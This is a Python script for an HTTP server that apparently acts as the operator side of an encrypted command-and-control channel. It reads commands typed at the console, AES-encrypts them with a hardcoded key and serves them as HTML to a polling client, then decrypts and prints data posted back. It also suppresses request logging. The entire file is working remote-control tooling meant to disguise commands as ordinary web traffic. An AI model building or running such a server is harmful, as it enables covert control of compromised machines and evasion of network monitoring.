import pyaes
import base64
from http.server import BaseHTTPRequestHandler, HTTPServer
import sys

# AES encryption/decryption key (Note: Use a secure, randomized key in production)
key = b"This_key_for_demo_purposes_only!"

def encrypt(data):
    """Encrypt data using AES CTR mode and encode it with base64.

    Args:
        data (str): The plaintext data to encrypt.

    Returns:
        str: The base64-encoded encrypted data.
    """
    aes = pyaes.AESModeOfOperationCTR(key)
    ciphertext = aes.encrypt(data.encode('utf-8'))
    return base64.b64encode(ciphertext).decode()

def decrypt(data):
    """Decrypt base64-encoded data encrypted with AES CTR mode.

    Args:
        data (str): The base64-encoded data to decrypt.

    Returns:
        str: The decrypted plaintext data.
    """
    aes = pyaes.AESModeOfOperationCTR(key)
    decoded_data = base64.b64decode(data)
    return aes.decrypt(decoded_data).decode('utf-8')

class CommandHandler(BaseHTTPRequestHandler):
    def _set_response_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        """Handle GET requests by prompting for a command, encrypting it, and sending it back."""
        self._set_response_headers()
        command = input('Enter command: ')
        encrypted_command = encrypt(command)
        html_response = f"<html><body><h1>{encrypted_command}</h1></body></html>"
        self.wfile.write(html_response.encode('utf-8'))

    def do_POST(self):
        """Handle POST requests by decrypting received data and printing the result."""
        self._set_response_headers()
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        decrypted_data = decrypt(post_data)
        print(f"Decrypted command: {decrypted_data}")

    def log_message(self, format, *args):
        """Suppress the default logging to stdout."""
        pass

def run_server(port=8880):
    """Start the HTTP server on the specified port.

    Args:
        port (int): The port number to listen on.
    """
    server_address = ('', port)
    httpd = HTTPServer(server_address, CommandHandler)
    print(f"Starting HTTP server on port {port}...")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down the server...")
        httpd.server_close()

if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8880
    run_server(port)
